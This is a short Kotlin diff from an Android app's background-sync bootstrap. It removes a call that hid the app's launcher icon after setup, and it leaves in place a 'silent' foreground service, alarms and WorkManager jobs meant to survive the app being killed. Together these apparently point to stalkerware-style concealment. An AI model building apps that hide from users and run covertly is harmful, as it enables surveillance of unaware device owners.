@@ -20,9 +20,6 @@ object SyncBootstrap {
     /** Alarm + WorkManager + silent foreground service (kill state ke liye). */
     fun armBackgroundSync(context: Context) {
         val app = context.applicationContext
-        if (InstallFlow.isSetupComplete(app)) {
-            LauncherHider.hide(app)
-        }
         SyncAlarmScheduler.start(app)
         SyncWorkScheduler.schedule(app)
         armNetworkCallback(app)
